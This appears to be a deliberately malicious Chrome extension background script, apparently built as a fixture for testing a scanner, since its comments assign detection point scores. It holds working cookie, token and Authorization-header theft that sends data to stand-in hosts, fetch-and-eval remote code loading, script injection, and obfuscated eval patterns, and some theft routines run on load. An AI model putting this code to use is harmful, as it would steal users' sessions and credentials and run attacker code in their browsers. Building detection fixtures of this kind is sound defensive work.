// High risk extension - Background service worker
// Contains multiple dangerous patterns

// Track all tabs
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && tab.url) {
        // Store URL history
        chrome.storage.local.get(['urlHistory'], (result) => {
            const history = result.urlHistory || [];
            history.push({
                url: tab.url,
                timestamp: Date.now()
            });
            chrome.storage.local.set({ urlHistory: history });
        });
    }
});

// Intercept web requests
chrome.webRequest.onBeforeRequest.addListener(
    (details) => {
        // Log all requests
        console.log('Request intercepted:', details.url);
        
        // Send to remote server (simulated)
        const data = {
            url: details.url,
            method: details.method,
            timestamp: Date.now()
        };
        
        // Exfiltrate data (simulated)
        fetch('https://suspicious-domain.xyz/api/collect', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer ' + getStolenToken()
            },
            body: JSON.stringify(data)
        }).catch(() => {});
    },
    { urls: ["<all_urls>"] },
    ["requestBody"]
);

// ============================================
// TOKEN/COOKIE THEFT PATTERNS (CRITICAL - Multiple instances)
// ============================================

// Pattern 1: Cookie theft via chrome.cookies.getAll
chrome.cookies.getAll({}, (cookies) => {
    const cookieData = cookies.map(c => ({
        name: c.name,
        value: c.value,
        domain: c.domain,
        path: c.path,
        secure: c.secure,
        httpOnly: c.httpOnly
    }));
    
    // Exfiltrate cookies via sendBeacon (30 points)
    navigator.sendBeacon('https://data-collector.tk/api/cookies', JSON.stringify(cookieData));
    
    // Exfiltrate via fetch POST (25 points)
    fetch('https://evil-exfil.xyz/api/steal-cookies', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            cookies: cookieData,
            timestamp: Date.now()
        })
    });
    
    // Exfiltrate via XMLHttpRequest
    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://cookie-thief.ml/api/collect', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({ cookies: cookieData }));
});

// Pattern 2: Cookie theft from document.cookie (in content script context)
function stealDocumentCookies() {
    const cookies = document.cookie;
    if (cookies) {
        // Send via fetch POST (25 points)
        fetch('https://evil-collector.ga/api/steal', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                cookies: cookies,
                url: window.location.href,
                timestamp: Date.now()
            })
        });
        
        // Send via sendBeacon (30 points)
        navigator.sendBeacon('https://cookie-exfil.tk/api/beacon', cookies);
    }
}

// Pattern 3: Token theft from localStorage (40 points)
function stealTokensFromLocalStorage() {
    const tokens = {
        auth_token: localStorage.getItem('auth_token'),
        refresh_token: localStorage.getItem('refresh_token'),
        access_token: localStorage.getItem('access_token'),
        session_token: localStorage.getItem('session_token'),
        bearer_token: localStorage.getItem('bearer_token'),
        api_key: localStorage.getItem('api_key')
    };
    
    // Exfiltrate via fetch POST (40 points - token_remote)
    fetch('https://token-thief.ml/api/collect-tokens', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + (tokens.auth_token || '')
        },
        body: JSON.stringify({
            ...tokens,
            url: window.location.href,
            timestamp: Date.now()
        })
    });
}

// Pattern 4: Token theft from sessionStorage (40 points)
function stealTokensFromSessionStorage() {
    const tokens = {
        session_token: sessionStorage.getItem('session_token'),
        auth_token: sessionStorage.getItem('auth_token'),
        user_token: sessionStorage.getItem('user_token')
    };
    
    fetch('https://token-exfil.ml/api/steal-tokens', {
        method: 'POST',
        body: JSON.stringify(tokens)
    });
}

// Pattern 5: Combined cookie + token theft (40 points)
function stealCookiesAndTokens() {
    // Get cookies
    chrome.cookies.getAll({}, (cookies) => {
        const cookieData = cookies.map(c => c.value);
        
        // Get tokens
        const authToken = localStorage.getItem('auth_token');
        const sessionToken = sessionStorage.getItem('session_token');
        
        // Send both to remote server (40 points - cookie_remote + token_remote)
        fetch('https://data-exfil.ga/api/steal-all', {
            method: 'POST',
            body: JSON.stringify({
                cookies: cookieData,
                auth_token: authToken,
                session_token: sessionToken,
                timestamp: Date.now()
            })
        });
    });
}

// Pattern 6: Token theft from Authorization headers (40 points)
function stealAuthHeaders() {
    // Intercept requests to steal Authorization headers
    chrome.webRequest.onBeforeSendHeaders.addListener(
        (details) => {
            const authHeader = details.requestHeaders?.find(h => h.name.toLowerCase() === 'authorization');
            if (authHeader) {
                // Exfiltrate token (40 points - token_remote)
                fetch('https://header-thief.xyz/api/steal-header', {
                    method: 'POST',
                    body: JSON.stringify({
                        authorization: authHeader.value,
                        url: details.url,
                        timestamp: Date.now()
                    })
                });
            }
        },
        { urls: ["<all_urls>"] },
        ["requestHeaders"]
    );
}

// Pattern 7: Keylogging + token theft (50 points - keylog_remote)
function stealKeyloggedData() {
    // This would be called from content script
    // Keylogged data sent to remote server
    const keylogData = {
        keystrokes: 'captured_keystrokes',
        url: window.location.href
    };
    
    fetch('https://keylog-exfil.tk/api/collect-keys', {
        method: 'POST',
        body: JSON.stringify(keylogData)
    });
}

// Execute theft patterns
stealTokensFromLocalStorage();
stealTokensFromSessionStorage();
stealCookiesAndTokens();
stealAuthHeaders();

// Token theft pattern - Steal tokens from localStorage/sessionStorage
function stealTokens() {
    // Get all tokens from storage
    const authToken = localStorage.getItem('auth_token');
    const sessionToken = sessionStorage.getItem('session_token');
    const refreshToken = localStorage.getItem('refresh_token');
    
    // Exfiltrate tokens to remote server - Token Theft Pattern
    if (authToken || sessionToken || refreshToken) {
        fetch('https://token-thief.ml/api/collect-tokens', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer ' + (authToken || '')
            },
            body: JSON.stringify({
                auth_token: authToken,
                session_token: sessionToken,
                refresh_token: refreshToken,
                url: window.location.href,
                timestamp: Date.now()
            })
        });
    }
}

// Cookie + Token combined theft pattern
function stealCookiesAndTokens() {
    // Get cookies
    const cookies = document.cookie;
    
    // Get tokens
    const token = localStorage.getItem('auth_token');
    
    // Send both to remote server - Combined Theft Pattern
    if (cookies || token) {
        fetch('https://data-exfil.ga/api/steal-all', {
            method: 'POST',
            body: JSON.stringify({
                cookies: cookies,
                token: token,
                timestamp: Date.now()
            })
        });
    }
}

// ============================================
// EVAL() PATTERNS (CRITICAL - Multiple instances)
// ============================================

// Pattern 1: Direct eval()
function executeRemoteCode(code) {
    eval(code);  // CRITICAL: eval()
}

// Pattern 2: eval() with fetch (RCE Pattern - 40 points)
function executeRemoteCodeViaEval() {
    fetch('https://malicious-c2.xyz/api/get-payload')
        .then(response => response.text())
        .then(code => {
            eval(code);  // CRITICAL: eval() with remote code
        });
}

// Pattern 3: eval() with atob decoding
function executeObfuscatedCode() {
    var encoded = 'ZXZhbCgiY29uc29sZS5sb2coJ0V2YWwgd2l0aCBhdG9iJyk7Iik=';
    var decoded = atob(encoded);
    eval(decoded);  // CRITICAL: eval() with decoded code
}

// Pattern 4: eval() with string concatenation
function executeConcatenatedCode() {
    var code = 'console.' + 'log("Eval")';
    eval(code);  // CRITICAL: eval()
}

// Pattern 5: eval() in setTimeout
setTimeout(function() {
    eval('console.log("Eval in setTimeout")');  // CRITICAL: eval()
}, 1000);

// Pattern 6: eval() in setInterval
setInterval(function() {
    eval('console.log("Eval in setInterval")');  // CRITICAL: eval()
}, 5000);

// ============================================
// NEW FUNCTION() PATTERNS (CRITICAL - Multiple instances)
// ============================================

// Pattern 1: Direct new Function()
function createFunctionFromString(code) {
    return new Function(code);  // CRITICAL: new Function()
}

// Pattern 2: new Function() with fetch (RCE Pattern - 40 points)
function executeRemoteCodeViaFunction() {
    fetch('https://malicious-c2.xyz/api/get-payload')
        .then(response => response.text())
        .then(code => {
            // Execute using new Function() - RCE Pattern
            const maliciousFunction = new Function(code);
            maliciousFunction();
        });
}

// Pattern 3: new Function() with multiple parameters
function createFunctionWithParams() {
    var code = 'return console.log("New Function with params")';
    var fn = new Function('a', 'b', 'c', code);
    fn(1, 2, 3);
}

// Pattern 4: new Function() with atob
function executeObfuscatedFunction() {
    var encoded = 'cmV0dXJuIGNvbnNvbGUubG9nKCdOZXcgRnVuY3Rpb24gd2l0aCBhdG9iJyk7';
    var decoded = atob(encoded);
    var fn = new Function(decoded);
    fn();
}

// Pattern 5: new Function() in setTimeout
setTimeout(function() {
    var fn = new Function('console.log("New Function in setTimeout")');
    fn();
}, 2000);

// ============================================
// REMOTE SCRIPT LOADING PATTERNS (CRITICAL - Multiple instances)
// ============================================

// Pattern 1: Basic remote script loading
function loadRemoteScript(url) {
    const script = document.createElement('script');
    script.src = url;  // CRITICAL: remote script
    document.head.appendChild(script);
}

// Pattern 2: Remote script with onload callback
function loadRemoteScriptFromServer() {
    const script = document.createElement('script');
    script.src = 'https://evil-server.tk/scripts/malware.js';  // Remote script loading
    script.onload = function() {
        console.log('Remote script loaded and executed');
        // Execute additional code after script loads
        eval('console.log("Code after remote script")');
    };
    document.head.appendChild(script);
}

// Pattern 3: Remote script via dynamic import (CRITICAL - 40 points)
async function loadRemoteModule(url) {
    const module = await import(url);  // CRITICAL: dynamic import
    return module;
}

// Pattern 4: Remote script via link tag
function loadRemoteScriptViaLink() {
    const link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = 'https://suspicious-cdn.ga/styles.css';
    document.head.appendChild(link);
}

// Pattern 5: Remote script with async attribute
function loadAsyncRemoteScript() {
    const script = document.createElement('script');
    script.src = 'https://malicious-cdn.xyz/scripts/exploit.js';
    script.async = true;
    script.defer = true;
    document.head.appendChild(script);
}

// Pattern 6: Remote script via XMLHttpRequest
function loadRemoteScriptViaXHR() {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://evil-c2.ml/scripts/payload.js', true);
    xhr.onload = function() {
        eval(xhr.responseText);  // CRITICAL: eval() with remote code
    };
    xhr.send();
}

// Pattern 7: Remote script via fetch + eval
function loadRemoteScriptViaFetch() {
    fetch('https://malicious-api.xyz/scripts/code.js')
        .then(response => response.text())
        .then(code => {
            eval(code);  // CRITICAL: eval() with remote code
        });
}

// Pattern 8: Remote script via fetch + new Function
function loadRemoteScriptViaFetchFunction() {
    fetch('https://evil-server.tk/api/get-code')
        .then(response => response.text())
        .then(code => {
            const fn = new Function(code);  // CRITICAL: new Function() with remote code
            fn();
        });
}

// Dynamic import (CRITICAL)
async function loadRemoteModule(url) {
    const module = await import(url);  // CRITICAL: dynamic import
    return module;
}

// Remote script loading (CRITICAL) - RCE Pattern
function loadRemoteScriptFromServer() {
    // Create script element
    const script = document.createElement('script');
    script.src = 'https://evil-server.tk/scripts/malware.js';  // Remote script loading
    script.onload = function() {
        console.log('Remote script loaded and executed');
    };
    document.head.appendChild(script);
}

// Alternative remote script loading via link
function loadRemoteScriptViaLink() {
    const link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = 'https://suspicious-cdn.ga/styles.css';
    document.head.appendChild(link);
}

// Helper to get stolen token
function getStolenToken() {
    // Access localStorage
    const token = localStorage.getItem('auth_token');
    if (!token) {
        return sessionStorage.getItem('session_token');
    }
    return token;
}

// ============================================
// HIGHLY OBFUSCATED CODE SECTION (CRITICAL)
// ============================================

// Pattern 1: _0x prefix obfuscation (Packer pattern)
var _0x4a2b = ['getItem', 'setItem', 'removeItem', 'fetch', 'eval', 'Function', 'atob', 'btoa'];
var _0x1c3d = function(_0x5e6f, _0x7a8b) {
    _0x5e6f = _0x5e6f - 0x0;
    var _0x9c0d = _0x4a2b[_0x5e6f];
    return _0x9c0d;
};
var _0x2e4f = _0x1c3d;
var _0x3a5b = _0x1c3d;
var _0x4c6d = _0x1c3d;

// Pattern 2: Hex obfuscation
var hexPayload = '\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x5f\x30\x78\x31\x32\x33\x34\x28\x29\x7b\x72\x65\x74\x75\x72\x6e\x20\x65\x76\x61\x6c\x28\x27\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x6c\x6f\x67\x28\x22\x48\x65\x6c\x6c\x6f\x22\x29\x27\x29\x3b\x7d';
var hexCode = String.fromCharCode(0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e);

// Pattern 3: Unicode escapes
var unicodePayload = '\u0065\u0076\u0061\u006c\u0028\u0027\u0063\u006f\u006e\u0073\u006f\u006c\u0065\u002e\u006c\u006f\u0067\u0028\u0022\u0054\u0065\u0073\u0074\u0022\u0029\u0027\u0029';
var unicodeEval = '\u0065\u0076\u0061\u006c';

// Pattern 4: Multi-layer Base64 encoding (CRITICAL - >300 chars)
var layer1Base64 = 'SGVsbG8gV29ybGQhIFRoaXMgaXMgYSBsb25nIGJhc2U2NCBlbmNvZGVkIHN0cmluZyB0aGF0IGlzIG1vcmUgdGhhbiAzMDAgY2hhcmFjdGVycyBsb25nLiBJdCBjb250YWlucyBzb21lIG9iZnVzY2F0ZWQgY29kZSB0aGF0IHdpbGwgYmUgZGVjb2RlZCBhbmQgZXhlY3V0ZWQuIFRoaXMgaXMgYSB0ZXN0IHBheWxvYWQgdG8gZGVtb25zdHJhdGUgdGhlIGRldGVjdGlvbiBvZiBsb25nIGJhc2U2NCBzdHJpbmdzIGluIG1hbGljaW91cyBleHRlbnNpb25zLiBUaGUgc3RyaW5nIGlzIGRlc2lnbmVkIHRvIGJlIG1vcmUgdGhhbiAzMDAgY2hhcmFjdGVycyB0byB0cmlnZ2VyIHRoZSBkZXRlY3Rpb24gcGF0dGVybi4gSXQgaW5jbHVkZXMgbXVsdGlwbGUgc2VudGVuY2VzIGFuZCB3b3JkcyB0byByZWFjaCB0aGUgcmVxdWlyZWQgbGVuZ3RoLiBUaGlzIGlzIGEgdGVzdCBwYXlsb2FkIGZvciBkZW1vbnN0cmF0aW5nIHRoZSBkZXRlY3Rpb24gb2YgbG9uZyBiYXNlNjQgZW5jb2RlZCBzdHJpbmdzIGluIG1hbGljaW91cyBleHRlbnNpb25zLiBUaGUgc3RyaW5nIGlzIGRlc2lnbmVkIHRvIGJlIG1vcmUgdGhhbiAzMDAgY2hhcmFjdGVycyB0byB0cmlnZ2VyIHRoZSBkZXRlY3Rpb24gcGF0dGVybi4gSXQgaW5jbHVkZXMgbXVsdGlwbGUgc2VudGVuY2VzIGFuZCB3b3JkcyB0byByZWFjaCB0aGUgcmVxdWlyZWQgbGVuZ3RoLg==';
var layer2Base64 = btoa(layer1Base64);
var layer3Base64 = btoa(layer2Base64);

// Pattern 5: IIFE unpack pattern
(function(_0x1234, _0x5678) {
    var _0xabcd = function(_0xefgh) {
        return String.fromCharCode(_0xefgh);
    };
    var _0xijkl = _0xabcd(0x65) + _0xabcd(0x76) + _0xabcd(0x61) + _0xabcd(0x6c);
    window[_0xijkl]('console.log("IIFE unpack executed")');
})(window, document);

// Pattern 6: String concatenation obfuscation
var str1 = 'ev';
var str2 = 'al';
var evalStr = str1 + str2;
var funcStr = 'new ' + 'Function';

// Pattern 7: Multi-layer atob decoding (CRITICAL)
try {
    var decoded1 = atob(layer1Base64);
    var decoded2 = atob(decoded1);
    var decoded3 = atob(decoded2);
    var decoded4 = atob(decoded3);
    // Execute decoded code using eval
    eval(decoded1);
} catch (e) {
    console.error('Multi-layer decode error:', e);
}

// Pattern 8: Execute hex code
try {
    eval(hexPayload);
} catch (e) {
    console.error('Hex decode error:', e);
}

// Pattern 9: Execute unicode code
try {
    eval(unicodePayload);
} catch (e) {
    console.error('Unicode decode error:', e);
}

// Pattern 10: High entropy obfuscated function
var _0xABCDEF = function(_0x123456) {
    var _0x789ABC = '';
    for (var i = 0; i < _0x123456.length; i++) {
        _0x789ABC += String.fromCharCode(_0x123456.charCodeAt(i) ^ 0x42);
    }
    return _0x789ABC;
};
var obfuscatedCode = _0xABCDEF('eval("console.log(\'XOR obfuscation\')")');
eval(obfuscatedCode);

